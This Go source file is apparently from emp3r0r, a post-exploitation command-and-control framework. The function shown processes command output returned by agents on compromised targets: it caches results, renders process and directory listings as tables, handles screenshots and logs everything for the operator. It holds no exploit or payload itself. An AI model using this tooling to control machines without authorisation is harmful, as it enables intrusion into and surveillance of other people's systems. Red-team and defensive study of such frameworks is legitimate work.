//go:build linux
// +build linux

package cc

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/olekukonko/tablewriter"
)

// CmdResults receive response from agent and cache them
var CmdResults = make(map[string]string)

// mutex
var CmdResultsMutex = &sync.Mutex{}

// processAgentData deal with data from agent side
func processAgentData(data *emp3r0r_def.MsgTunData) {
	TargetsMutex.RLock()
	defer TargetsMutex.RUnlock()
	payloadSplit := strings.Split(data.Payload, emp3r0r_def.MagicString)
	op := payloadSplit[0]

	target := GetTargetFromTag(data.Tag)
	contrlIf := Targets[target]
	if target == nil || contrlIf == nil {
		LogError("Target %s cannot be found, however, it left a message saying:\n%v",
			data.Tag, payloadSplit)
		return
	}

	if op != "cmd" {
		return
	}

	// cmd output from agent
	cmd := payloadSplit[1]
	cmd_slice := util.ParseCmd(cmd)
	out := strings.Join(payloadSplit[2:len(payloadSplit)-1], " ")

	is_builtin_cmd := strings.HasPrefix(cmd, "!")

	// time spent on this cmd
	cmd_id := payloadSplit[len(payloadSplit)-1]
	// cache this cmd response
	CmdResultsMutex.Lock()
	CmdResults[cmd_id] = out
	CmdResultsMutex.Unlock()
	start_time, err := time.Parse("2006-01-02 15:04:05.999999999 -0700 MST", CmdTime[cmd_id])
	if err != nil {
		LogWarning("Parsing timestamp '%s': %v", CmdTime[cmd_id], err)
	} else {
		time_spent := time.Since(start_time)
		if is_builtin_cmd {
			LogDebug("Command %s took %s", strconv.Quote(cmd), time_spent)
		} else {
			LogInfo("Command %s took %s", strconv.Quote(cmd), time_spent)
		}
	}

	// headless mode
	if IsAPIEnabled {
		// send to socket
		var resp APIResponse
		msg := fmt.Sprintf("%s:\n%s", cmd, out)
		resp.Cmd = cmd
		resp.MsgData = []byte(msg)
		resp.Alert = false
		resp.MsgType = CMD
		data, err := json.Marshal(resp)
		if err != nil {
			log.Printf("processAgentData cmd output: %v", err)
			return
		}
		_, err = APIConn.Write([]byte(data))
		if err != nil {
			log.Printf("processAgentData cmd output: %v", err)
		}
	}

	switch cmd_slice[0] {
	// screenshot command
	case "screenshot":
		go func() {
			err = processScreenshot(out, target)
			if err != nil {
				LogError("%v", err)
			}
		}()

		// ps command
	case "ps":
		var procs []util.ProcEntry
		err = json.Unmarshal([]byte(out), &procs)
		if err != nil {
			LogError("ps: %v:\n%s", err, out)
			return
		}

		// build table
		tdata := [][]string{}
		tableString := &strings.Builder{}
		table := tablewriter.NewWriter(tableString)
		table.SetHeader([]string{"Name", "PID", "PPID", "User"})
		table.SetBorder(true)
		table.SetRowLine(true)
		table.SetAutoWrapText(true)
		table.SetColWidth(20)

		// color
		table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

		table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor})

		// fill table
		for _, p := range procs {
			pname := util.SplitLongLine(p.Name, 20)
			tdata = append(tdata, []string{pname, strconv.Itoa(p.PID), strconv.Itoa(p.PPID), p.Token})
		}
		table.AppendBulk(tdata)
		table.Render()
		out = tableString.String()

		// resize pane since table might mess up
		x := len(strings.Split(out, "\n")[0])
		FitPanes(x)

		// ls command
	case "ls":
		var dents []util.Dentry
		err = json.Unmarshal([]byte(out), &dents)
		if err != nil {
			LogError("ls: %v:\n%s", err, out)
			return
		}

		// build table
		tdata := [][]string{}
		tableString := &strings.Builder{}
		table := tablewriter.NewWriter(tableString)
		table.SetHeader([]string{"Name", "Type", "Size", "Time", "Permission"})
		table.SetRowLine(true)
		table.SetBorder(true)
		table.SetColWidth(20)
		table.SetAutoWrapText(true)

		// color
		table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor},
			tablewriter.Colors{tablewriter.Bold, tablewriter.FgCyanColor})

		table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor},
			tablewriter.Colors{tablewriter.FgBlueColor})

		// fill table
		for _, d := range dents {
			dname := util.SplitLongLine(d.Name, 20)
			tdata = append(tdata, []string{dname, d.Ftype, d.Size, d.Date, d.Permission})
		}

		// print table
		table.AppendBulk(tdata)
		table.Render()
		out = tableString.String()

		// resize pane since table might mess up
		x := len(strings.Split(out, "\n")[0])
		FitPanes(x)
	}

	// Command output
	no_need_to_show := strings.HasPrefix(cmd, emp3r0r_def.C2CmdPortFwd) ||
		strings.HasPrefix(cmd, emp3r0r_def.C2CmdSSHD) || strings.HasPrefix(cmd, emp3r0r_def.C2CmdListDir)
	if DebugLevel < 3 {
		// ignore some cmds
		if no_need_to_show {
			return
		}
	}
	agent_output := fmt.Sprintf("\n[%s] %s:\n%s\n\n",
		color.CyanString("%d", contrlIf.Index),
		color.HiMagentaString(cmd),
		color.HiWhiteString(out))
	OutputPane.Printf(false, "%s", agent_output)
	logf, err := os.OpenFile(AgentOuputLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		LogError("Failed to open agent log file: %v", err)
		return
	}
	defer logf.Close()
	logf.WriteString(agent_output)
}
